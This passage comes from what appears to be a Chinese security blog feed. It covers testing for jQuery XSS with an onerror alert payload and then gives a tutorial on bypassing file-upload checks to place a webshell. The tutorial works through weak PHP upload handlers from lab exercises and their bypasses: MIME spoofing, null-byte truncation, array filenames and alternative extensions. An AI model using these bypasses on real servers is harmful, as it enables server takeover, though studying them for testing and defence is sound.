<h2 id="漏洞测试方法"><a href="#漏洞测试方法" class="headerlink" title="漏洞测试方法"></a>漏洞测试方法</h2><p>F12打开Console窗口，输入以下代码显示jquery版本号</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.fn.jquery</span><br></pre></td></tr></table></figure>

<p>输入以下代码,如果有弹窗出现说明存在XSS漏洞</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;element[attribute=&#x27;&lt;img src=123123 οnerrοr=alert(123)&gt;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>升级jQuery库到jquery-3.4.0以上或者最新版本</p>
<p>更新版本有可能存在众多问题，所以在不改变版本的情况下避免漏洞的利用（或者使用插件jQuery Migrate）</p>
<h3 id="临时修复方案"><a href="#临时修复方案" class="headerlink" title="临时修复方案"></a>临时修复方案</h3><ul>
<li><p> jquery文件重命名</p>
</li>
<li><p>把jquery文件里头部带有版本号的注释删除</p>
</li>
<li><p>把jquery文件内版本号清除（不推荐）</p>
</li>
<li><p> 在 jquery文件中重写版本号</p>
</li>
</ul>
<p>一部分调用的插件失效了，所以在这里是重写jquery版本而不是清除jquery版本</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gqat654fwcj30dz02nmx4.jpg" alt="jQuery库版本过低.png"></p>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="http://research.insecurelabs.org/jquery/test/">JQuery跨站脚本在线测试</a></p>
<p><a href="https://blog.csdn.net/kang1011/article/details/109682718?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-3-109682718&spm=3001.4430">解决jquery版本过低引发的XSS跨站安全漏洞</a></p>
<p><a href="https://blog.csdn.net/adminhui/article/details/103035516?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-4-103035516&spm=3001.4430">jquery版本安全漏洞问题</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>其他漏洞</category>
      </categories>
      <tags>
        <tag>跨域漏洞</tag>
        <tag>第三方库漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>//0053789dab3b.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>　　文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件</p>
<h2 id="文件上传漏洞条件"><a href="#文件上传漏洞条件" class="headerlink" title="文件上传漏洞条件"></a>文件上传漏洞条件</h2><ul>
<li>上传的文件可以被web服务器当作脚本来执行</li>
<li>我们可以访问上传文件的路径</li>
</ul>
<h2 id="服务器上传文件命名规则"><a href="#服务器上传文件命名规则" class="headerlink" title="服务器上传文件命名规则"></a>服务器上传文件命名规则</h2><ul>
<li>第一种：上传文件名和服务器命名一致</li>
<li>第二种：上传文件名和服务器命名不一致（随机，时间日期命名等），但是后缀一致</li>
<li>第三种：上传文件名和服务器命名不一致（随机，时间日期命名等），后缀不一致</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>　　由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件。打个比方来说，如果你使用 php 作为服务器端的脚本语言，那么在你网站的上传功能处，就一定不能让用户上传 php 类型的文件，否则他上传一个木马文件，你服务器就被他控制了。因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p>
<p>一般我们会利用文件上传漏洞上传一句话木马，然后用工具连接获取 webshell。</p>
<p>但是这里有两个问题：</p>
<ul>
<li>第一你的文件能上传到web服务器，并且知道上传的路径</li>
<li>第二你的文件能被当成脚本文件执行，所以要想让上传文件被当成脚本执行，我们经常会和文件包含漏洞和文件解析漏洞一起利用</li>
</ul>
<h1 id="文件上传检测方式"><a href="#文件上传检测方式" class="headerlink" title="文件上传检测方式"></a>文件上传检测方式</h1><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="JS前端脚本检查"><a href="#JS前端脚本检查" class="headerlink" title="JS前端脚本检查"></a>JS前端脚本检查</h3><p>　　前端检测文件扩展名。当客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，前端的 js 脚本就对文件的扩展名进行检测来判断是否是可以上传的类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<ol>
<li>直接禁用JavaScript实现绕过</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxttva6j30mn01rq2t.jpg"></p>
<ol start="2">
<li>先把文件扩展名改成允许上传的文件类型，再利用burp suite抓包改成自己想要的文件类型，即可绕过</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtwi0xj30le04xjsh.jpg"></p>
<p>找到上传地址</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtxuonj30g3038jrp.jpg"></p>
<p>用工具链接即可</p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="检查后缀"><a href="#检查后缀" class="headerlink" title="检查后缀"></a>检查后缀</h3><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>主要在服务端对数据包的MIME进行检查，修改content-type:image/jpeg即可</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">修改之前</button></li><li class="tab"><button type="button" data-href="#-2">修改之后</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtwe87j30i7049gmh.jpg"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>把 Content-Type: application/octet-stream</p>
<p>改成 Content-Type: image/jpeg</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtp5g1j30jw048gmh.jpg"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>无论是%00还是0x00，最终被解析之后都表示ascll码中的0，而ascll码中的0作为特殊字符保留，代表NULL，表示空字符，当一个字符串中存在空字符的时候，在被解析的时候就会导致空字符后面的字符被丢弃</p>
<p>%00代表着url的转换，通常用于get传参的00截断</p>
<p>php版本&lt;5.3.4的时候会出现这个情况</p>
<p>且要关闭参数<code>magic_quotes_gpc</code>，设置为OFF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>在这里发现文件上传的路径是可控的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>保存文件时是将get得到的路径与随机数年月日和上传文件名拼接到一起，所以上传文件路径可控，我们将get的路径最后改为<code>test.php0x00</code>那么拼接到后面的内容就会被丢弃。</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">修改之前</button></li><li class="tab"><button type="button" data-href="#-2">修改之后</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5r2rekkwj31050hfdkv.jpg" alt="文件上传-00截断1.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>在url路径后面写入<code>test.php%00</code></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5r4txbw9j30zq0dcjuj.jpg" alt="文件上传-00截断2.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5rjhb6igj30do0203yn.jpg" alt="文件上传-00截断3.png"></p>
<p>上传之后直接访问<code>/upload/test.php</code>即可</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h5 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h5><p>无论是%00还是0x00，最终被解析之后都表示ascll码中的0，而ascll码中的0作为特殊字符保留，代表NULL，表示空字符，当一个字符串中存在空字符的时候，在被解析的时候就会导致空字符后面的字符被丢弃</p>
<p>0x00通常用于post传参的00截断</p>
<p>php版本&lt;5.3.4的时候会出现这个情况</p>
<p>且要关闭参数<code>magic_quotes_gpc</code>，设置为OFF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>在这里发现文件上传的路径是可控的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>这次是使用post进行上传，在这里对二进制进行修改</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">修改之前</button></li><li class="tab"><button type="button" data-href="#-2">修改之后</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5ruya6vij31140ikn1b.jpg" alt="文件上传-00截断4.png"></p>
<p>在这里把<code>../upload/</code>改为<code>../upload/test.php</code></p>
<p>十六进制如下</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5somd3t9j310c05gjrj.jpg" alt="文件上传-00截断7.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5smgnjrzj311e0gbae2.jpg" alt="文件上传-00截断6.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5smgkakhj3105055mxc.jpg" alt="文件上传-00截断5.png"></p>
<p>修改十六进制，添加一个00字节</p>
<p>然后上传</p>
<p>有时候也可以直接写成<code>../upload/test.php.jpg</code></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5rjhb6igj30do0203yn.jpg" alt="文件上传-00截断3.png"></p>
<p>上传之后直接访问<code>/upload/test.php</code>即可</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h5 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h5><p>通过file<sub>n<sub>ame = reset(file) . ‘.’ . file[count(file) - 1];<br>可以知道最终的文件名是由数组的第一个和最后一个元素拼接而成，如果上传不是不是数组，就自己拆成数组，就提供了绕过条件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>上传php文件，抓包，修改以下内容</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq8rg3w13qj30lx09v0u7.jpg" alt="文件上传-数组.png"></p>
<p>最后上传的文件为<code>test.php</code>，直接访问即可</p>
<h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="上传特殊可解析后缀"><a href="#上传特殊可解析后缀" class="headerlink" title="上传特殊可解析后缀"></a>上传特殊可解析后缀</h5><p>服务端进行黑名单验证，当上传的文件后缀是asp,aspx,php,jsp时，文件禁止上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>一个语言的后缀不一定是唯一的，我们上传同类后缀也可以执行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP:php,php2,php3,php4,php5,phtml,pht</span><br><span class="line">ASP:asp,aspx,ascx,ashx,cer,asa</span><br><span class="line">JSP:jsp,jspx,jspf,jsw</span><br><span class="line">exe:exe,exee</span><br><span class="line">....</span><br></pre></td></tr></table></figure>



<h5 id="后缀大小写绕过"><a href="#后缀大小写绕过" class="headerlink" title="后缀大小写绕过"></a>后缀大小写绕过</h5><p>在语言中，后缀的大小写是不影响使用的，所以，即使后缀是PHP，Php等这样的后缀也被看作php执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span 